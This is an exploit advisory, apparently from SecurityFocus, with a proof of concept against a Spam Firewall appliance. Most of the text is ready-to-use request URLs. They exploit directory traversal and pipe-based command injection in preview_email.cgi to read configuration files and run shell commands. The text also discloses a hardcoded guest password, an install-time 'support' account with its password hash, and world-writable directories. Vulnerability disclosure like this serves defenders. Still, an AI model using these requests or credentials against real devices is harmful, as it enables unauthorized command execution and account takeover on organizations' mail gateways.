source: http://www.securityfocus.com/bid/19276/info

Spam Firewall is prone to multiple vulnerabilities, including a directory-traversal issue, access-validation issue, and a remote command-execution issue.

A remote attacker can exploit these issues to gain access to potentially sensitive information and execute commands in the context of the affected application.

Versions 3.3.01.001 to 3.3.03.055 are vulnerable to these issues.

####################################################################
 
Proof of Concept:
https://<deviceIP>/cgi-bin/preview_email.cgi?file=/mail/mlog/../tmp/backup/periodic_config.txt.tmp
https://<deviceIP>/cgi-bin/preview_email.cgi?file=/mail/mlog/../../bin/ls%20/|
 
 
####################################################################
 
#using |unix| for command execution:
 
https://<deviceIP>/cgi-bin/preview_email.cgi?file=/mail/mlog/|uname%20-a|

#admin login/pass vuln
 
https://<deviceIP>/cgi-bin/preview_email.cgi?file=/mail/mlog|cat%20update_admin_passwd.pl|
https://<deviceIP>/cgi-bin/preview_email.cgi?file=/mail/mlog/../bin/update_admin_passwd.pl
 
eg.

#`/home/emailswitch/code/firmware/current/bin/updateUser.pl guest phteam99 2>&1`;
login: guest pass: phteam99

some folder are accessible via http without permission
https://<deviceIP>/Translators/
https://<deviceIP>/images/
https://<deviceIP>/locale
https://<deviceIP>/plugins
https://<deviceIP>/help
 
#stuff in do_install
 
/usr/sbin/useradd support -s /home/emailswitch/code/firmware/current/bin/request_support.pl -p swUpHFjf1MUiM
 
## Create backup tmp dir

/bin/mkdir -p /mail/tmp/backup/
chmod -R 777 /mail/tmp/
 
## Create smb backup mount point
/bin/mkdir -p /mnt/smb/
chmod 777 /mnt/smb/